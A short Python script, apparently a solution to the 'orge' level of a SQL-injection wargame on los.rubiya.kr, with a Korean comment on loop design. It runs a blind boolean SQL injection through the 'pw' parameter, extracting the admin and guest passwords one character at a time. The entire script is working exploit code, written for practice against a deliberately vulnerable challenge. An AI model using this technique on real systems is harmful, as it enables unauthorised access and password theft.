import requests as req 

url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
ck={"PHPSESSID":"냠냠"}

# admin's pw length = 8
# guest's pw length = 17

ans_ad=''
ans_gu=''

for i in range(8):
	i += 1
	for j in range(33, 126):
		params = {"pw":f"'||ascii(substr(pw, {i}, 1))={j}-- "}
		with req.get(url, params=params, cookies=ck) as res:
			if "Hello admin" in res.text:
				ans_ad += chr(j)
				print("admin's pw =", ans_ad)
				break

for i in range(17):
	i += 1
	for j in range(33, 126):
		params = {"pw":f"'||ascii(substr(pw, {i}, 1))={j}-- "}
		with req.get(url, params=params, cookies=ck) as res:
			if "Hello guest" in res.text:
				ans_gu += chr(j)
				print("guest's pw =", ans_gu)
				break
'''
반복문을 하나로 해서 동시에 
admin과 guest의 pw를 알아낼까 했지만 
한 글자 알아내고 바로 break로 
탈출하는게 빠를 것 같아서 따로 했다.
'''

